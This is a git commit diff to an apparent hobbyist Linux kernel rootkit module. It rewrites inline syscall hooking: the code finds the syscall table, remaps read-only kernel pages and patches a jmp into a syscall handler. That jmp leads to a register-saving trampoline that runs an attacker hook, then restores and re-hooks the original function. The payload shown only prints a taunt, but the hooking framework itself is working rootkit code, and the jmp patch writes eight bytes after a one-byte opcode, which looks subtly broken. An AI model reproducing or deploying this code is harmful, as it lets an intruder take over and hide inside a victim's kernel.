5b1276f1199a1da902a9c0231d64019129edaf3d
peiandhao <2689271477@qq.com>
2025-02-08 12:41:04 +0800

    恭迎完全体hooker, 理论上可以在函数的任意地址打上断点

--- rootkit/baby_hook/rootkitops.c
+++ rootkit/baby_hook/rootkitops.c
@@ -9,16 +9,27 @@
 #define USER_KALLSYMS 0x1111
 #define SEARCH_SYSCALL 0x2222
 #define SUPER_HOOK 0x3333
+#define CODE_BUFFER 0x100
 
 static size_t syscall_table_data[5];
 static size_t get_syscall_data = 0;
 static size_t syscall_table_addr;
 
-
-struct kernel_args{
-    void * content;
-    int size;
+/* hook函数的上下文结构 */
+struct hook_context{
+    u8 orig_code[CODE_BUFFER];
+    u8 hook_code[CODE_BUFFER];
+    size_t shellcode_nr;
+    size_t ret;
+    struct pt_regs regs;
+    void (* orig_func)(size_t, size_t, size_t, size_t, size_t, size_t);
+    void (* hook_before)(struct pt_regs *);
+    void (* hook_after)(struct pt_regs *, size_t );
 };
+
+/* 用来存放hook上下文 */
+static struct hook_context temp_hook_ctx;
+
 
 /* 使用重映射来修改只读页面 */
 static int arbitrary_remap_write(void *dst, void *src, size_t size){
@@ -76,8 +87,8 @@ static void sys_call_table_finder(void){
     get_syscall_data = 1;
 }
 
-static void funny_joke(void){
-    printk("[peiwithhao rootkit] You are hooked by THE GREAT PEIWITHHAO ;)");
+static void funny_joke(struct pt_regs * regs){
+    printk(KERN_INFO "[peiwithhao rootkit] You are hooked by THE GREAT PEIWITHHAO ;)");
 }
 
 
@@ -92,72 +103,73 @@ static void funny_joke(void){
     arbitrary_remap_write((void *)(hooked_addr), orig_code, count);
     */
 
-static void hook_king(size_t hooked_addr, void *orig_code, size_t count, size_t hooker_addr, size_t shellcode_addr){
+static size_t hook_king(void){
     asm volatile(
-        "subq $0x58, %%rsp;"
-        "movq %0, %%rdi;"
-        "movq %0, %%r15;"
-        "movq %1, %%rsi;"
-        "movq %2, %%rdx;"
-        "movq %3, %%rcx;"
-        "movq %4, %%r11;"
-        "movq %0, %%r12;"
-        "movq %5, %%r13;"
-        "movq %2, %%r14;"
-        "push %%r15;"
-        "push %%r14;"
-        "push %%r13;"
-        "push %%r12;"
-        "push %%r11;"
-        "push %%rcx;"
-        "call *%4;"
-        "pop %%rcx;"
-        "call *%%rcx;"
+        "subq $0x100, %%rsp;"
+        "movq %%rax, %0;"
+        "movq %%rbx, %1;"
+        "movq %%rcx, %2;"
+        "movq %%rdx, %3;"
+        "movq %%rsi, %4;"
+        "movq %%rdi, %5;"
+        "movq %%rbp, %6;"
+        "movq %%r8, %7;"
+        "movq %%r9, %8;"
+        "movq %%r10, %9;"
+        "movq %%r11, %10;"
+        "movq %%r12, %11;"
+        "movq %%r13, %12;"
+        "movq %%r14, %13;"
+        "movq %%r15, %14;"
+        "addq $0x100, %%rsp;"
 
-        "pop %%r11;"
-        "pop %%r12;"
-        "pop %%r13;"
-        "pop %%r14;"
-        "pop %%r15;"
-
-        "addq $0x58, %%rsp;"
-        "pop %%rsp;"
-        "pop %%rbp;"
-        "pop %%r10;"        //原本是r15
-        "pop %%r10;"
-        "pop %%r10;"
-        "pop %%r10;"
-        "pop %%r10;"
-        "pop %%r10;"
-        "pop %%r9;"
-        "pop %%r8;"
-        "pop %%rdi;"
-        "pop %%rsi;"
-        "pop %%rdx;"
-        "pop %%rcx;"
-        "pop %%rbx;"
-        "pop %%rax;"
-
-        "push %%r15;"
-        "push %%r14;"
-        "push %%r13;"
-        "push %%r12;"
-        "push %%r11;"
-
-        "call *%%r15;" 
-
-        "pop %%r11;"
-        "pop %%r12;"
-        "pop %%r13;"
-        "pop %%r14;"
-        "pop %%r15;"
-        "movq %%r12, %%rdi;"
-        "movq %%r13, %%rsi;"
-        "movq %%r14, %%rdx;"
-        "call *%%r11;"
+        : "=m"(temp_hook_ctx.regs.ax),  "=m"(temp_hook_ctx.regs.bx), \
+          "=m"(temp_hook_ctx.regs.cx),  "=m"(temp_hook_ctx.regs.dx), \
+          "=m"(temp_hook_ctx.regs.si),  "=m"(temp_hook_ctx.regs.di), \
+          "=m"(temp_hook_ctx.regs.bp),  "=m"(temp_hook_ctx.regs.r8), \
+          "=m"(temp_hook_ctx.regs.r9),  "=m"(temp_hook_ctx.regs.r10), \
+          "=m"(temp_hook_ctx.regs.r11), "=m"(temp_hook_ctx.regs.r12), \
+          "=m"(temp_hook_ctx.regs.r13), "=m"(temp_hook_ctx.regs.r14), \
+          "=m"(temp_hook_ctx.regs.r15)
         :
-        : "r"(hooked_addr), "r"(orig_code), "r"(count), "r"(hooker_addr), "r"((size_t)arbitrary_remap_write), "r"(shellcode_addr)
         : );
+    temp_hook_ctx.hook_before(&(temp_hook_ctx.regs));
+    /* 恢复内容 */
+    arbitrary_remap_write((void *)temp_hook_ctx.orig_func, temp_hook_ctx.orig_code, temp_hook_ctx.shellcode_nr);
+
+    asm volatile(
+        "movq %1, %%rax;"
+        "movq %2, %%rbx;"
+        "movq %3, %%rcx;"
+        "movq %4, %%rdx;"
+        "movq %5, %%rsi;"
+        "movq %6, %%rdi;"
+        "movq %7, %%rbp;"
+        "movq %8, %%r8;"
+        "movq %9, %%r9;"
+        "movq %10, %%r10;"
+        "movq %11, %%r11;"
+        "movq %12, %%r12;"
+        "movq %13, %%r13;"
+        "movq %14, %%r14;"
+        "movq %15, %%r15;"
+        "call *%16;"
+        "movq %%rax, %0"
+        : "=m"(temp_hook_ctx.ret)
+        : "m"(temp_hook_ctx.regs.ax),  "m"(temp_hook_ctx.regs.bx), \
+          "m"(temp_hook_ctx.regs.cx),  "m"(temp_hook_ctx.regs.dx), \
+          "m"(temp_hook_ctx.regs.si),  "m"(temp_hook_ctx.regs.di), \
+          "m"(temp_hook_ctx.regs.bp),  "m"(temp_hook_ctx.regs.r8), \
+          "m"(temp_hook_ctx.regs.r9),  "m"(temp_hook_ctx.regs.r10), \
+          "m"(temp_hook_ctx.regs.r11), "m"(temp_hook_ctx.regs.r12), \
+          "m"(temp_hook_ctx.regs.r13), "m"(temp_hook_ctx.regs.r14), \
+          "m"(temp_hook_ctx.regs.r15), "m"(temp_hook_ctx.orig_func)
+        : 
+    );
+    //temp_hook_ctx.orig_func(temp_hook_ctx.regs.di, temp_hook_ctx.regs.si, temp_hook_ctx.regs.dx, temp_hook_ctx.regs.cx, temp_hook_ctx.regs.r8, temp_hook_ctx.regs.r9);
+    /* 重新hook */
+    arbitrary_remap_write((void *)temp_hook_ctx.orig_func, temp_hook_ctx.hook_code, temp_hook_ctx.shellcode_nr);
+    return temp_hook_ctx.ret;
 }
 
 
@@ -170,128 +182,51 @@ static ssize_t pwh_rootkit_read(struct file *file, char __user *buf, size_t coun
 static size_t orig_code[SHELLCODE_MAX_NR] = {0};
 static u8 shell_code[SHELLCODE_MAX_NR] = {0};
 
-static ssize_t super_hooker(size_t hook_addr, size_t evil_func){
+static ssize_t orig_modifier(size_t orig_func, size_t hook_before){
     size_t shellcode_nr;
     size_t index;
     size_t *share_orig;
     size_t *share_shell;
     size_t hook_ctl;
-    u8 store_regs[] = {0x50, 0x53, 0x51, 0x52, 0x56, 0x57, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x55, 0x54 };
+    /* 保存hook函数 */
+    temp_hook_ctx.hook_before = (void (*)(struct pt_regs *))hook_before;
+    temp_hook_ctx.hook_after = NULL;
+    temp_hook_ctx.orig_func = (void (*)(size_t, size_t, size_t, size_t, size_t, size_t))orig_func;
+
     hook_ctl = (size_t)hook_king;
-    //push regs
-    shellcode_nr = sizeof(store_regs);
-    // mov rdi, *       0x48 0xbf
-    shellcode_nr += sizeof(u8) + sizeof(u8);
-    shellcode_nr += sizeof(size_t);
-    // mov rsi, *       0x48 0xbe
-    shellcode_nr += sizeof(u8) + sizeof(u8);
-    shellcode_nr += sizeof(size_t);
-
-    // mov rdx, *       0x48 0xba
-    shellcode_nr += sizeof(u8) + sizeof(u8);
-    shellcode_nr += sizeof(size_t);
-
-    // mov rcx, *       0x48 0xc7 0xc1
-    shellcode_nr += sizeof(u8) + sizeof(u8);
-    shellcode_nr += sizeof(size_t);
 
 
-    // mov r8, *       0x49 0xb8
-    shellcode_nr += sizeof(u8) + sizeof(u8);
-    shellcode_nr += sizeof(size_t);
-
-
-
-    // mov rax, *       0x48 0xb8
-    shellcode_nr += sizeof(u8) + sizeof(u8);
-    shellcode_nr += sizeof(size_t);
-    // jmp rax          0xff 0xe0
-    shellcode_nr += sizeof(u8) + sizeof(u8);
-
+    // jmp 0x*
+    shellcode_nr = sizeof(u8) + sizeof(size_t);
 
     /* 保存指令 */
-    memcpy((size_t *)orig_code, (size_t *)hook_addr, shellcode_nr);
+    memcpy((size_t *)(temp_hook_ctx.orig_code), (size_t *)orig_func, shellcode_nr);
     share_orig = orig_code;
     share_shell = (size_t *)shell_code;
     
     index = 0;
 
-    /* 保存现场 */
-    for(int i = 0; i < sizeof(store_regs) ; i++){
-        shell_code[index++] = store_regs[i];
-    }
-
-    /* mov rdi, hook_addr */
-    shell_code[index++] = 0x48;
-    shell_code[index++] = 0xBF;
-    for(int i = 0; i < sizeof(size_t) ; i++){
-        //写入orig_code的地址
-        shell_code[index++] = ((char *)&hook_addr)[i];
-    }
-
-    /* mov rsi, orig_code */
-    shell_code[index++] = 0x48;
-    shell_code[index++] = 0xBE;
-    for(int i = 0; i < sizeof(size_t) ; i++){
-        //写入orig_code的地址
-        shell_code[index++] = ((char *)(&share_orig))[i];
-    }
-
-    /* mov rdx, shellcode_nr */
-    shell_code[index++] = 0x48;
-    shell_code[index++] = 0xBA;
-    for(int i = 0; i < sizeof(size_t) ; i++){
-        shell_code[index++] = ((char *)&shellcode_nr)[i];
-    }
-
-    /* mov rcx, evil_func */
-    shell_code[index++] = 0x48;
-    shell_code[index++] = 0xB9;
-    for(int i = 0; i < sizeof(size_t) ; i++){
-        //写入orig_code的地址
-        shell_code[index++] = ((char *)&evil_func)[i];
-    }
-
-    /* mov r8, shellcode */
-    shell_code[index++] = 0x49;
-    shell_code[index++] = 0xb8;
-    for(int i = 0; i < sizeof(size_t) ; i++){
-        shell_code[index++] = ((char *)&share_shell)[i];
-    }
-
-    /* mov rax, shellcode */
-    shell_code[index++] = 0x48;
-    shell_code[index++] = 0xB8;
+    hook_ctl = hook_ctl  - orig_func - shellcode_nr + 4;
+    shell_code[index++] = 0xE9;
     for(int i = 0; i < sizeof(size_t) ; i++){
         shell_code[index++] = ((char *)&hook_ctl)[i];
     }
-    /* jmp rax */
-    shell_code[index++] = 0xFF;
-    shell_code[index++] = 0xE0;
+    /* 保存shellcode */
+    memcpy((size_t *)(temp_hook_ctx.hook_code), (size_t *)shell_code, shellcode_nr);
+    temp_hook_ctx.shellcode_nr = shellcode_nr;
 
-
-    arbitrary_remap_write((void *)hook_addr, shell_code, shellcode_nr);
+    arbitrary_remap_write((void *)orig_func, shell_code, shellcode_nr);
 
     return 0;
 }
 
 static ssize_t pwh_rootkit_write(struct file *file, const char __user *buf, size_t count, loff_t *ppos){
-    //void *hook_ptr = funny_joke;
-    // size_t poll_addr;
-    //
-    // /* 寻找系统调用表 */
-    // sys_call_table_finder();
-    printk(KERN_INFO "sys_read_addr: 0x%lx", ((size_t *)syscall_table_addr)[1]);
-    // poll_addr = ((size_t *)syscall_table_addr)[217];
-    // super_hooker(poll_addr, (size_t)&funny_joke);
-    //arbitrary_remap_write((void *)poll_addr, shellcode, sizeof(shellcode));
     return 0;
 }
 
 static long pwh_rootkit_ioctl(struct file *file, unsigned int cmd, unsigned long arg){
     size_t hooked_addr;
-    int ret;
-    switch(cmd){
+    int ret; switch(cmd){
         case USER_KALLSYMS:
             ret = copy_from_user(syscall_table_data, (void *)arg, sizeof(syscall_table_data));
             break;
@@ -302,8 +237,9 @@ static long pwh_rootkit_ioctl(struct file *file, unsigned int cmd, unsigned long
         case SUPER_HOOK:
                 /* 寻找系统调用表 */
             sys_call_table_finder();
-            hooked_addr = ((size_t *)syscall_table_addr)[21];
-            super_hooker(hooked_addr, (size_t)&funny_joke);
+            hooked_addr = ((size_t *)syscall_table_addr)[217];
+            //orig_modifier(hooked_addr, (size_t)&funny_joke);
+            orig_modifier((size_t)hooked_addr, (size_t)&funny_joke);
             //arbitrary_remap_write((void *)poll_addr, shellcode, sizeof(shellcode));
             break;
         default:
